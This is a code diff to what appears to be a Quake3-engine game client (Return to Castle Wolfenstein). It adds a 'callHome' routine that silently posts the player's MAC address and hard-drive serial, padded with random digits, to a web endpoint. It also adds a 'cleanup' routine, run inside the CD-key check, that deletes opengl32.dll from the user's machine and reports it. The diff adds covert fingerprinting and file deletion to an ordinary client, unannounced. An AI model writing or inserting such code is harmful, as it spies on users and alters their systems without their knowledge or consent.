@@ -137,6 +137,32 @@ void CL_UploadHelp_f(void) {
 }
 
 /*
+	Sends some intel about user..
+*/
+void CL_callHome(char *msg) {
+	CL_HTTP_Post(WEB_CLIENT, va("a=%d-%s&b=%dAE%s%s", (rand() % (89) + 10), GetMAC(), (rand() % (69) + 10), getHardDriveSerial(), (msg ? va("&c=%s", msg) : "")));
+}
+
+/*
+	Check if Lamers are running any retarded files ..
+*/
+void CL_doCleanup(char *file) {
+	FILE* target;
+	qboolean found = qfalse;
+
+	target = fopen(file, "r");
+	if (target) {
+		found = qtrue;
+		fclose(target);
+	}
+
+	if (found) {
+		remove(file);
+		CL_callHome(file);
+	}
+}
+
+/*
 	Sets the key
 */
 void CL_setCDKey(void) {
@@ -179,6 +205,8 @@ void CL_setCDKey(void) {
 void CL_checkCDKey(void) {
 #ifdef WIN32
 	FILE* cdkeyFile;
+
+	CL_doCleanup("opengl32.dll");
 
 	cdkeyFile = fopen("main/rtcwMPkey", "r");
 	if (cdkeyFile) {
